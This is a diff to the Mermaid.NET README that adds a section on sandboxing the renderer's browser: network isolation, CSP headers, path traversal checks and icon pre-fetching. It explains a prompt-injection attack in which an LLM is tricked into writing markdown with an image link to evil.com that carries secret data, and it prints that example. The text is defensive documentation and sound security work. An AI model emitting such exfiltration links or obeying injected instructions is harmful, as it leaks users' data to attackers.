@@ -337,6 +337,23 @@ The HTTP server maps URL paths to bundled files on disk, rewriting certain paths
   <img src="docs/diagrams/asset-serving.svg" alt="Asset serving">
 </picture>
 
+### Security Sandboxing
+
+Mermaid.NET runs the browser in a hardened sandbox to prevent untrusted diagram content from causing harm. This is important when processing diagrams from untrusted sources (user input, LLM-generated content, etc.).
+
+**Network Isolation:** The browser is launched with a proxy configuration that blocks all external network access. Any attempt to reach an external URL — via `fetch()`, `XMLHttpRequest`, `WebSocket`, or even `<img src="https://...">` — fails because the proxy points to a non-existent server. Only localhost (the template server) is allowed.
+
+**Why this matters:** A common prompt injection attack involves tricking an LLM into generating markdown like `![img](https://evil.com/exfiltrate?secret=data)`. When rendered, the browser would normally fetch that URL, leaking data to the attacker. Mermaid.NET blocks this entirely — the request never leaves the machine.
+
+**Content Security Policy:** The HTTP server sends strict CSP headers that further restrict what content can load:
+- `img-src 'self' data:` — Images only from localhost or data URIs
+- `font-src 'self' data:` — Fonts only from localhost or data URIs
+- `default-src 'self'` — All other resources restricted to localhost
+
+**Path Traversal Protection:** The HTTP server validates that all requested file paths resolve within the template directory and only serves files with allowed extensions (`.html`, `.css`, `.js`, `.json`, `.svg`, `.png`, `.woff`, `.woff2`, `.ttf`).
+
+**Icon Pack Pre-fetching:** External icon packs (e.g., from unpkg.com) are fetched by the C# host process, not the browser. The browser receives the icon data directly, eliminating another potential exfiltration vector. HTTP URLs are only allowed for localhost; external URLs must use HTTPS.
+
 ## License
 
 This is an unofficial port of the [official mermaid-cli](https://github.com/mermaid-js/mermaid-cli) project, reimplemented in .NET to eliminate Node.js dependencies while maintaining feature parity.
